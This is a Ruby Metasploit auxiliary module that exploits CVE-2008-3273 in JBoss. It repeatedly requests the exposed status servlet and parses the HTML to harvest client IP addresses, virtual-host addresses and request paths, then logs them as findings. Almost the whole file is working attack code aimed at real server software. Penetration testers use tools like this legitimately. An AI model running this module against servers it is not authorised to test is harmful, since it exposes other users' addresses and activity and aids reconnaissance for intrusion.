##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Jboss Status Servlet Info Gathering',
      'Description' => %q{
        This module queries the Jboss status servlet to collect sensitive
        information: URL paths, GET parameters and the clients IP address.

        Note: this module has been tested against Jboss 4.0., 4.2.2, 4.2.3
      },
      'References'  =>
        [
          ['CVE', '2008-3273'],
          ['URL', 'http://seclists.org/fulldisclosure/2011/Sep/139'],
          ['URL', 'https://www.owasp.org/images/a/a9/OWASP3011_Luca.pdf'],
          ['URL', 'http://www.slideshare.net/chrisgates/lares-fromlowtopwned'],
        ],
      'Author'      => 'Matteo Cantoni <goony[at]nothink.org>',
      'License'     => MSF_LICENSE
    )

    register_options([
      Opt::RPORT(8080),
      OptString.new('PATH', [ true,  "The Jboss status servlet URI path", '/status']),
      OptInt.new('REQCOUNT', [false, 'Number of HTTP requests', 3]),
      OptInt.new('DELAY', [false, "Delay in seconds between requests",5])
    ], self.class)
  end

  def run_host(target_host)

    jpath = normalize_uri(datastore['PATH'])

    req_src  = []
    req_dst  = []
    req_path = []

    # loop to detect more informations
    datastore['REQCOUNT'].times do |count|
      vprint_status("#{rhost}:#{rport} #{count + 1}/#{datastore['REQCOUNT']} requests...")

      begin
        res = send_request_raw({
          'uri'    => jpath,
          'method' => 'GET'
        }, 10)

        # detect JBoss application server
        if res and res.code == 200 and res.body.match(/<title>Tomcat Status<\/title>/)
          http_fingerprint({ :response => res })

          html_rows = res.body.split(/<strong>/)
          html_rows.each do |row|

            #Stage      Time    B Sent  B Recv  Client  VHost   Request
            #K  150463510 ms    ?       ?       1.2.3.4 ?       ?

            # filter client requests
            if row.match(/(.*)<\/strong><\/td><td>(.*)<\/td><td>(.*)<\/td><td>(.*)<\/td><td>(.*)<\/td><td nowrap>(.*)<\/td><td nowrap>(.*)<\/td><\/tr>/)

              j_src  = $5
              j_dst  = $6
              j_path = $7

              req_src << j_src
              if !j_dst.match(/\?/)
                req_dst << j_dst
              end
              if !j_path.match(/\?/)
                req_path << j_path
              end
            end
          end
        elsif res.code == 401
          vprint_error("#{rhost}:#{rport} authentication is required!")
          return
        elsif res.code == 403
          vprint_error("#{rhost}:#{rport} forbidden!")
          return
        else
          vprint_error("#{rhost}:#{rport} may not support JBoss application server!")
          return
        end
      end

      if datastore['DELAY'] > 0 and datastore['REQCOUNT'] > 1
        vprint_status("#{rhost}:#{rport} sleeping for #{datastore['DELAY']} seconds...")
        select(nil,nil,nil,datastore['DELAY'])
      end
    end

    # show results
    if !req_src.empty?

      print_good("#{rhost}:#{rport} JBoss application server!")
      report_note({
        :host  => target_host,
        :proto => 'tcp',
        :sname => (ssl ? 'https' : 'http'),
        :port  => rport,
        :type  => 'JBoss application server',
        :data  => "#{rhost}:#{rport}"
      })

      print_line
      print_good("CLIENTS IP ADDRESSES:")
      req_src.sort.uniq.each do |e|
        print_good("#{e}")
      end

      print_line
      print_good("SERVER (VHOST) IP ADDRESSES:")
      req_dst.sort.uniq.each do |e|
        print_good("#{e}")
      end

      print_line
      print_good("PATH REQUESTS:")
      req_path.sort.uniq.each do |e|
        print_good("#{e}")

        report_note({
          :host  => target_host,
          :proto => 'tcp',
          :sname => (ssl ? 'https' : 'http'),
          :port  => rport,
          :type  => 'JBoss application server info',
          :data  => "#{rhost}:#{rport} #{e}"
        })
      end

    end
  end
end
